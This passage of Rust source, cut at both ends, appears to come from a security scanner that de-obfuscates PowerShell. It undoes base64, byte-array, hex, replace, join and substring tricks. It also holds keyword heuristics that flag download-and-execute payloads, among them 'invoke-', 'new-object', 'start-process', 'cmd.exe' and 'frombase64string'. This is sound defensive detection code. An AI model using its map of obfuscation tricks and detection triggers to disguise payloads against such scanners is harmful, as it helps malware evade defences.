    let stream = if wrapper.contains("gzipstream") {
        PsCompressionStream::Gzip
    } else if wrapper.contains("deflatestream") {
        PsCompressionStream::Deflate
    } else {
        return None;
    };
    Some((start, end, stream))
}

fn expand_json_script_base64(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = JSON_SCRIPT_B64_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let b64 = caps.get(2)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_variables(text: &str) -> String {
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let var = caps.get(2)?.as_str().to_ascii_lowercase();
            let b64 = bindings.get(&var)?;
            let decoded = decode_ps_base64_string(b64)?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decode_ps_base64_string(encoded: &str) -> Option<Vec<u8>> {
    let cleaned: String = encoded.chars().filter(|c| !c.is_whitespace()).collect();
    if cleaned.is_empty() {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(cleaned)
        .ok()
}

fn expand_getstring_byte_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_BYTE_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str();
            let bytes = parse_ps_byte_array(caps.get(2)?.as_str())?;
            if bytes.len() > 128 * 1024 {
                return None;
            }
            let value = decode_ps_getstring_bytes(encoding, &bytes)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_byte_array(nums: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    for part in nums.split(',') {
        let part = part.trim();
        let value = if let Some(hex) = part.strip_prefix("0x").or_else(|| part.strip_prefix("0X")) {
            u16::from_str_radix(hex, 16).ok()?
        } else {
            part.parse::<u16>().ok()?
        };
        let byte = u8::try_from(value).ok()?;
        out.push(byte);
        if out.len() > 128 * 1024 {
            return None;
        }
    }
    (!out.is_empty()).then_some(out)
}

fn decode_ps_getstring_bytes(encoding: &str, bytes: &[u8]) -> Option<String> {
    match encoding.to_ascii_lowercase().as_str() {
        "unicode" => decode_utf16_lossy(bytes, false),
        "bigendianunicode" => decode_utf16_lossy(bytes, true),
        "utf32" => decode_utf32_lossy(bytes, false),
        _ => Some(String::from_utf8_lossy(bytes).into_owned()),
    }
}

fn expand_convert_frombase64_literals(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let mut matches = Vec::new();
    let mut cursor = 0usize;
    while let Some(rel) = lower[cursor..].find("frombase64string") {
        let name_start = cursor + rel;
        // Walk back ~32 bytes to look for the `[...Convert]::` prefix, but
        // clamp to a UTF-8 char boundary — a fixed byte offset can land
        // inside a multi-byte char (e.g. CJK-named vars), which would panic
        // the `text[search_start..name_start]` slice below.
        let mut search_start = name_start.saturating_sub(32);
        while search_start > 0 && !text.is_char_boundary(search_start) {
            search_start -= 1;
        }
        let Some(bracket_rel) = text[search_start..name_start].rfind('[') else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let call_start = search_start + bracket_rel;
        if !lower[call_start..name_start].contains("convert]::") {
            cursor = name_start + "frombase64string".len();
            continue;
        }
        let Some(open_rel) = text[name_start..].find('(') else {
            break;
        };
        let mut pos = name_start + open_rel + 1;
        while pos < text.len() {
            let Some(ch) = text[pos..].chars().next() else {
                break;
            };
            if !ch.is_whitespace() {
                break;
            }
            pos += ch.len_utf8();
        }
        let Some((b64, quote_end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let mut end = quote_end;
        while end < text.len() {
            let Some(ch) = text[end..].chars().next() else {
                break;
            };
            if ch.is_whitespace() {
                end += ch.len_utf8();
                continue;
            }
            if ch == ')' {
                end += ch.len_utf8();
            }
            break;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let decoded = decode_payload(&decoded).into_owned();
        let decoded_lower = decoded.to_ascii_lowercase();
        if !decoded_lower.contains("http://")
            && !decoded_lower.contains("https://")
            && !decoded_lower.contains("download")
            && !decoded_lower.contains("frombase64string")
            && !decoded_lower.contains("invoke-")
        {
            cursor = end;
            continue;
        }
        let decoded = decoded.replace('\'', "''");
        matches.push((call_start, end, format!("'{decoded}'")));
        cursor = end;
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn append_decoded_frombase64_literals(text: &str) -> String {
    let mut out = text.to_string();
    let mut seen = std::collections::HashSet::new();
    for caps in FROMB64_LONG_LITERAL_RE.captures_iter(text) {
        let Some(b64) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !seen.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let decoded = decode_payload(&decoded);
        let decoded_lower = decoded.to_ascii_lowercase();
        if decoded_lower.contains("http://")
            || decoded_lower.contains("https://")
            || decoded_lower.contains("download")
            || decoded_lower.contains("frombase64string")
        {
            out.push('\n');
            out.push_str(&decoded);
        }
    }
    out
}

fn should_inline_base64_decoded_payload(decoded: &[u8]) -> bool {
    if decoded.is_empty() {
        return false;
    }
    let text = decode_payload(decoded);
    let lower = text.to_ascii_lowercase();
    if lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("download")
        || lower.contains("frombase64string")
        || lower.contains("invoke-")
        || lower.contains("powershell")
        || lower.contains("new-object")
        || lower.contains("start-process")
        || lower.contains("cmd.exe")
    {
        return true;
    }

    if decoded.len() > 64 * 1024 {
        return false;
    }
    let printable = decoded
        .iter()
        .filter(|b| b.is_ascii_graphic() || matches!(**b, b' ' | b'\r' | b'\n' | b'\t'))
        .count();
    let hard_controls = decoded
        .iter()
        .filter(|b| b.is_ascii_control() && !matches!(**b, b'\r' | b'\n' | b'\t'))
        .count();
    printable * 100 >= decoded.len() * 90 && hard_controls * 100 <= decoded.len()
}

fn decode_utf16_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 2 != 0 {
        return None;
    }
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|pair| {
            if big_endian {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .collect();
    Some(String::from_utf16_lossy(&u16s))
}

fn decode_utf32_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 4 != 0 {
        return None;
    }
    let decoded: String = bytes
        .chunks_exact(4)
        .map(|chunk| {
            let value = if big_endian {
                u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            } else {
                u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            };
            char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER)
        })
        .collect();
    Some(decoded)
}

fn expand_base64_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[allow(clippy::expect_used)]
static PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'''([^'\r\n]{1,8192})'''"#)
        .expect("ps embedded single quote assignment")
});

fn expand_ps_embedded_single_quote_assignments(text: &str) -> String {
    PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE
        .replace_all(text, "$$$1=\"'$2'\"")
        .into_owned()
}

#[allow(clippy::expect_used)]
static REGEX_REPLACE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[regex\]::Replace\s*\(\s*'([^']*)'\s*,\s*''?([^']*)''?\s*,\s*''?([^']*)''?\s*\)"#,
    )
    .expect("regex replace call")
});

#[allow(clippy::expect_used)]
static B64_REGEX_REPLACE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'+([^']*)'+\s*,\s*'+([^']*)'+\s*\)\s*\)"#,
    )
    .expect("b64 regex replace variable call")
});

fn expand_regex_replace_calls(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = REGEX_REPLACE_CALL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let haystack = caps.get(1)?.as_str();
            let needle = caps.get(2)?.as_str();
            let repl = caps.get(3)?.as_str();
            Some((
                full.start(),
                full.end(),
                format!("'{}'", haystack.replace(needle, repl)),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_regex_replace_base64_variables(text: &str) -> String {
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_REGEX_REPLACE_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let var = caps.get(1)?.as_str().to_ascii_lowercase();
            let needle = caps.get(2)?.as_str();
            let replacement = caps.get(3)?.as_str();
            let value = bindings.get(&var)?;
            let b64 = value.replace(needle, replacement);
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let decoded = decode_payload(&decoded).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("'{decoded}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn ps_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(name.as_str().to_ascii_lowercase(), value);
        }
    }
    bindings
}

fn expand_start_process_argument_list(text: &str) -> String {
    let mut out = text.to_string();
    let mut cursor = 0usize;
    let lower = text.to_ascii_lowercase();
    while let Some(rel) = lower[cursor..].find("-argumentlist") {
        let pos = cursor + rel + "-argumentlist".len();
        let Some((inner, end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = pos;
            continue;
        };
        let normalized = inner
            .replace("\\\"", "\"")
            .replace("`\"", "\"")
            .replace("\\'", "'");
        let normalized_lower = normalized.to_ascii_lowercase();
        if normalized_lower.contains("frombase64string")
            || normalized_lower.contains("download")
            || normalized.contains("http://")
            || normalized.contains("https://")
        {
            out.push('\n');
            out.push_str(&normalized);
        }
        cursor = end;
    }
    out
}

fn parse_ps_quoted_argument(text: &str, start: usize) -> Option<(String, usize)> {
    let mut pos = start;
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        if !ch.is_whitespace() {
            break;
        }
        pos += ch.len_utf8();
    }
    let quote = text[pos..].chars().next()?;
    if quote != '\'' && quote != '"' {
        return None;
    }
    pos += quote.len_utf8();
    let mut out = String::new();
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        pos += ch.len_utf8();
        if ch == quote {
            if quote == '\'' && text[pos..].starts_with('\'') {
                out.push('\'');
                pos += 1;
                continue;
            }
            return Some((out, pos));
        }
        if quote == '"' && ch == '`' {
            if let Some(next) = text[pos..].chars().next() {
                out.push(next);
                pos += next.len_utf8();
                continue;
            }
        }
        out.push(ch);
    }
    None
}

#[allow(clippy::expect_used)]
static HEX_SPLIT_CHAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)'((?:[0-9a-f]{2}\s+){3,}[0-9a-f]{2})'\s*-Split\s*['"][^'"]*['"]\s*(?:\|\s*)?foreach(?:-object)?\s*\{[^{}]*?toint16\s*\(\s*\$_\s*,\s*16\s*\)[^{}]*?\}"#,
    )
    .expect("hex split char loop")
});

fn expand_hex_split_char_loop(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = HEX_SPLIT_CHAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let hex = caps.get(1)?.as_str();
            let bytes: Vec<u8> = hex
                .split_whitespace()
                .filter_map(|part| u8::from_str_radix(part, 16).ok())
                .collect();
            if bytes.is_empty() {
                return None;
            }
            let decoded = String::from_utf8_lossy(&bytes).into_owned();
            Some((full.start(), full.end(), format!("'{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static GETSTRING_UNWRAP_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*'([^']*)'\s*\)"
    ).expect("getstring unwrap")
});

fn expand_getstring_wrapper(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = GETSTRING_UNWRAP_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{}'", inner)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'\s*-(?:[ic])?replace\s*'([^'\\]*(?:\\.[^'\\]*)*)'\s*,\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#)
        .expect("replace")
});

fn expand_ps_replace(text: &str) -> String {
    let mut out = text.to_string();
    // Run repeatedly so chained -replace ('a' -replace 'x','y' -replace 'z','w') works.
    loop {
        let mut hit = false;
        let next: Vec<(usize, usize, String)> = REPLACE_RE
            .captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let haystack = caps.get(1)?.as_str();
                let needle = caps.get(2)?.as_str();
                let repl = caps.get(3)?.as_str();
                let new_str = haystack.replace(needle, repl);
                Some((full.start(), full.end(), format!("'{}'", new_str)))
            })
            .collect();
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
            hit = true;
        }
        if !hit {
            break;
        }
    }
    loop {
        let next = find_ps_double_quoted_replace_operator_matches(&out);
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
    }
    out
}

fn find_ps_double_quoted_replace_operator_matches(text: &str) -> Vec<(usize, usize, String)> {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find('"') {
        let literal_start = start + rel;
        let Some((literal_end, haystack)) = parse_ps_static_quoted_literal(text, literal_start)
        else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        let Some(after_operator) = parse_ps_replace_operator(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, after_operator);
        let Some((needle_end, needle)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        let replaced = haystack.replace(&needle, &repl).replace('\'', "''");
        matches.push((literal_start, repl_end, format!("'{replaced}'")));
        start = repl_end;
    }
    matches
}

fn parse_ps_replace_operator(text: &str, pos: usize) -> Option<usize> {
    if text.as_bytes().get(pos) != Some(&b'-') {
        return None;
    }
    let mut pos = pos + 1;
    if text
        .as_bytes()
        .get(pos)
        .is_some_and(|b| b.eq_ignore_ascii_case(&b'i') || b.eq_ignore_ascii_case(&b'c'))
    {
        pos += 1;
    }
    let end = pos.checked_add("replace".len())?;
    let method = text.get(pos..end)?;
    if !method.eq_ignore_ascii_case("replace") {
        return None;
    }
    if text
        .as_bytes()
        .get(end)
        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
    {
        return None;
    }
    Some(end)
}

fn expand_ps_dot_replace(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find(['\'', '"']) {
        let literal_start = start + rel;
        let Some((literal_end, haystack)) = parse_ps_static_quoted_literal(text, literal_start)
        else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Replace".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Replace") {
            start = literal_end;
            continue;
        }
        pos += "Replace".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((needle_end, needle)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_static_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, repl_end);
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        let replaced = haystack.replace(&needle, &repl);
        matches.push((literal_start, pos + 1, format!("'{}'", replaced)));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

fn expand_ps_dot_substring(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find(['\'', '"']) {
        let literal_start = start + rel;
        let Some((literal_end, value)) = parse_ps_static_quoted_literal(text, literal_start) else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Substring".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Substring") {
            start = literal_end;
            continue;
        }
        pos += "Substring".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((after_start, start_idx)) = parse_ps_usize_arg(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, after_start);
        let mut len_arg = None;
        if bytes.get(pos) == Some(&b',') {
            pos = skip_ascii_ws(bytes, pos + 1);
            let Some((after_len, len)) = parse_ps_usize_arg(text, pos) else {
                start = literal_end;
                continue;
            };
            len_arg = Some(len);
            pos = skip_ascii_ws(bytes, after_len);
        }
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        let chars: Vec<char> = value.chars().collect();
        if start_idx > chars.len() {
            start = pos + 1;
            continue;
        }
        let end_idx = match len_arg {
            Some(len) => start_idx.saturating_add(len),
            None => chars.len(),
        };
        if end_idx > chars.len() {
            start = pos + 1;
            continue;
        }
        let sliced: String = chars[start_idx..end_idx].iter().collect();
        if sliced.len() > 8192 {
            start = pos + 1;
            continue;
        }
        matches.push((
            literal_start,
            pos + 1,
            format!("'{}'", sliced.replace('\'', "''")),
        ));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

fn parse_ps_static_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let quote = text.as_bytes().get(start).copied()?;
    if quote == b'\'' {
        return parse_ps_single_quoted_literal(text, start);
    }
    if quote != b'"' {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        pos += ch.len_utf8();
        if ch == '"' {
            return Some((pos, out));
        }
        if ch == '$' {
            return None;
        }
        if ch == '`' {
            let escaped = text[pos..].chars().next()?;
            pos += escaped.len_utf8();
            out.push(escaped);
            continue;
        }
        out.push(ch);
    }
    None
}

fn parse_ps_usize_arg(text: &str, start: usize) -> Option<(usize, usize)> {
    let bytes = text.as_bytes();
    let mut pos = start;
    while bytes.get(pos).is_some_and(u8::is_ascii_digit) {
        pos += 1;
    }
    if pos == start {
        return None;
    }
    let value = text[start..pos].parse().ok()?;
    Some((pos, value))
}

#[allow(clippy::expect_used)]
static JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // (?:'a',"b",'c') -join 'sep' or @('a',"b",'c') -join "sep"
    // Outer parens are optional for the bare array form.
    Regex::new(r#"@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#)
        .expect("join")
});

#[allow(clippy::expect_used)]
static JOIN_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)""#).expect("join part")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Join\s*\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*,\s*@?\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)\s*\)"#,
    )
    .expect("string join")
});

#[allow(clippy::expect_used)]
static STRING_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Concat\s*\(\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)"#,
    )
    .expect("string concat")
});

#[allow(clippy::expect_used)]
static SINGLE_LITERAL_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")"#,
    )
    .expect("single literal join")
});

#[allow(clippy::expect_used)]
static SPLIT_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\(?\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-(?:[ic])?split\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#,
    )
    .expect("split join")
});

fn expand_single_literal_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SINGLE_LITERAL_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            if previous_non_whitespace(text, full.start()) == Some(',') {
                return None;
            }
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))?
                .as_str();
            Some((full.start(), full.end(), format!("'{}'", value)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_split_join_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SPLIT_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
            let split_sep = split_literal_separator(caps.get(3).or_else(|| caps.get(4))?.as_str())?;
            let join_sep = caps.get(5).or_else(|| caps.get(6))?.as_str();
            if split_sep.is_empty() || split_sep.len() > 64 || join_sep.len() > 64 {
                return None;
            }
            let parts: Vec<&str> = value.split(split_sep.as_str()).collect();
            if parts.is_empty() || parts.len() > 256 {
                return None;
            }
            let joined = parts.join(join_sep);
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn split_literal_separator(sep: &str) -> Option<String> {
    if sep.is_empty() {
        return None;
    }
    if sep.len() == 2 && sep.starts_with('\\') {
        let escaped = sep.as_bytes()[1] as char;
        if r#"\.^$|?*+()[]{}"#.contains(escaped) {
            return Some(escaped.to_string());
        }
    }
    if sep.as_bytes().iter().any(|b| {
        matches!(
            b,
            b'\\'
                | b'.'
                | b'^'
                | b'$'
                | b'|'
                | b'?'
                | b'*'
                | b'+'
                | b'('
                | b')'
                | b'['
                | b']'
                | b'{'
                | b'}'
        )
    }) {
        return None;
    }
    Some(sep.to_string())
}

#[allow(clippy::expect_used)]
static REVERSE_STRING_SLICE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\[\s*-1\s*\.\.\s*-(\d+)\s*\]\s*-join\s*(?:''|"")"#,
    )
    .expect("reverse string slice join")
});

fn expand_reverse_string_slice_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = REVERSE_STRING_SLICE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(4))
                .or_else(|| caps.get(5))?
                .as_str();
            let requested_len: usize =
                caps.get(3).or_else(|| caps.get(6))?.as_str().parse().ok()?;
            let chars: Vec<char> = value.chars().collect();
